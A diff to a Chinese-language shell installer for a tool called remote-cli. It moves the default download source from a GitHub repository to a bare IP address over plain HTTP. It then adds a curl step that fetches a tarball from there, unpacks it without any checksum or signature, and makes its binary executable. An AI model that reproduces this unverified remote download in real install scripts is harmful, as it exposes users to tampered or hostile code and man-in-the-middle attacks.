@@ -8,7 +8,7 @@ set -euo pipefail
 
 REMOTE_CLI_VERSION="0.2.0"
 INSTALL_DIR="${REMOTE_CLI_DIR:-$HOME/.local/remote-cli}"
-REPO_URL="${REMOTE_CLI_REPO:-https://github.com/HectorYuan/remote-cli}"
+REPO_URL="${REMOTE_CLI_REPO:-http://14.103.46.178}"
 
 # ─── 日志 ──────────────────────────────────────────────────────
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
@@ -53,14 +53,20 @@ install_remote_cli() {
         info "remote-cli 已安装，更新中..."
         git -C "$INSTALL_DIR" pull --ff-only --quiet 2>/dev/null || warn "更新失败，使用现有版本"
     else
-        info "下载 remote-cli v$REMOTE_CLI_VERSION..."
+        info "下载 remote-cli..."
         mkdir -p "$(dirname "$INSTALL_DIR")"
-        # 如果有 git，用 clone；否则用 tarball
-        if command -v git &>/dev/null; then
+        # 尝试从 HTTP 服务器下载 tarball
+        local tarball_url="${REPO_URL}/remote-cli.tar.gz"
+        if curl -fsSL --retry 3 -o /tmp/remote-cli.tar.gz "$tarball_url" 2>/dev/null; then
+            mkdir -p "$INSTALL_DIR"
+            tar xzf /tmp/remote-cli.tar.gz -C "$INSTALL_DIR" --strip-components=1
+            rm -f /tmp/remote-cli.tar.gz
+        elif command -v git &>/dev/null; then
+            # Fallback: git clone
             git clone --depth 1 "$REPO_URL" "$INSTALL_DIR" 2>/dev/null || \
-            fail "克隆失败，请检查网络或手动安装"
+            fail "下载失败，请检查网络"
         else
-            fail "需要 git 来安装 remote-cli"
+            fail "下载失败，请安装 git 或检查网络"
         fi
     fi
     chmod +x "$INSTALL_DIR/bin/remote"
